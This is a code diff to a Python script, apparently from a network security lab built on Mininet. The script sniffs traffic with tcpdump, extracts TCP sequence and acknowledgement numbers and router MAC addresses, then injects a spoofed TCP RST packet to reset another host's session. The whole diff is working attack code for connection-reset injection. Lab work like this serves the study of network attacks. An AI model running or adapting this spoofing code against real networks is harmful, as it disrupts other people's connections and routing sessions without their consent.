@@ -2,6 +2,7 @@
 
 import termcolor as T # grey red green yellow blue magenta cyan white
 import os
+import sys
 import ctypes
 
 from subprocess import Popen, PIPE
@@ -16,7 +17,7 @@ def log(s, col="green"):
 	print T.colored(s, col)
 
 
-def send_rst_packet(srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
+def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
 	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
 
 	tcp = TCP(flags="RA")
@@ -25,13 +26,13 @@ def send_rst_packet(srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
 	tcp.seq=int(seqNum)
 	tcp.ack=int(ackNum)
 
-	tcp.display()
-
 	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
 
-	send(spoofed_packet)
+	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
 
-	# TODO test if packet is received by R2
+	frame.display()
+
+	sendp(frame, iface='atk1-eth0')
 
 
 def extract_address_port(value):
@@ -44,48 +45,108 @@ def extract_address_port(value):
 	return address, port
 
 
-def extract_useful_data(row):
+def extract_ports_and_numbers(row):
+	print row
+
+	srcPort, dstPort, seqNum, ackNum = None, None, None, None
+
 	values = row.split(' ')
 
-	source_address_port, destination_address_port, sequence_number, acknowledge_number = None, None, None, None
+	a = values[2].split('.')
+	srcAddr = '.'.join(a[0:4])
 
-	for i, x in enumerate(values):
-		print '[', i, ']', x
+	b = values[4].replace(':', '').split('.')
+	dstAddr = '.'.join(b[0:4])
 
-	if 'ARP' not in values[1]:
-		source_address, source_port = extract_address_port(values[2])
+	if srcAddr == SOURCE_ADDRESS and dstAddr == DESTINATION_ADDRESS and values[7] == 'seq':
+		srcPort = a[4]
+		dstPort = b[4]
 
-		if source_address == SOURCE_ADDRESS:
-			destination_address, destination_port = extract_address_port(values[4].replace(':', ''))
+		values[8] = values[8].replace(',', '')
 
-			if values[7] == 'seq':
-				if ':' in values[8]:
-					sequence_number = values[8].replace(',', '').split(':')[1]
-				else:
-					sequence_number = values[8].replace(',', '')
+		if ':' in values[8]:
+			seqNum = values[8].split(':')[1]
+		else:
+			seqNum = values[8]
 
-				acknowledge_number = values[10].replace(',', '')
+		ackNum = values[10].replace(',', '')
 
-				print source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number
+	return srcPort, dstPort, seqNum, ackNum
 
-				send_rst_packet(source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number)
 
-	print
+def retrieve_atk1_mac_address(iface):
+	p = Popen(('ifconfig'), stdout=PIPE)
+
+	for row in iter(p.stdout.readline, b''):
+		if iface in row:
+			values = row.split(' ')
+
+			p.kill()
+
+			return values[5]
+
+	p.kill()
+
+	return None
+
+
+def extract_r2_mac_addresses(row):
+	values = row.split(' ')
+
+	if '9.0.0.2' in values[9]:
+		return values[1].replace(',','')
+
+	if '9.0.0.2' in values[11]:
+		return values[3].replace(',','')
+
+	return None
+
+
+def retrieve_r2_mac_address():
+	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth0', '-lnSe'), stdout=PIPE)
+
+	r2_mac_address = None
+
+	for row in iter(p.stdout.readline, b''):
+		r2_mac_address = extract_r2_mac_addresses(row)
+
+		if r2_mac_address != None:
+			break
+
+	p.kill()
+
+	return r2_mac_address
+
+
+def retrieve_ports_and_numbers():
+	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)
+
+	srcPort, dstPort, seqNum, ackNum = None, None, None, None
+
+	for row in iter(p.stdout.readline, b''):
+		srcPort, dstPort, seqNum, ackNum = extract_ports_and_numbers(row)
+
+		if srcPort and dstPort and seqNum and ackNum:
+			p.kill()
+
+			return srcPort, dstPort, seqNum, ackNum
+
+		srcPort, dstPort, seqNum, ackNum = None, None, None, None
 
 
 def main():
-	# TODO 	using tcp dump retrieve absolute SN and AN for R3
-	# 		then launch attack using attack_scripts/*
-	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)
+	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
+	print 'source MAC address', src_mac_address
 
-	package_num = 1
+	dst_mac_address = retrieve_r2_mac_address()
+	print 'destination MAC address', dst_mac_address
 
-	for row in iter(p.stdout.readline, b''):
-		print 'package', package_num
+	srcPort, dstPort, seqNum, ackNum = retrieve_ports_and_numbers()
+	print srcPort, dstPort
+	print seqNum, ackNum
 
-		extract_useful_data(row)
+	send_rst_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum)
 
-		package_num = package_num + 1
 
 if __name__ == "__main__":
 	main()
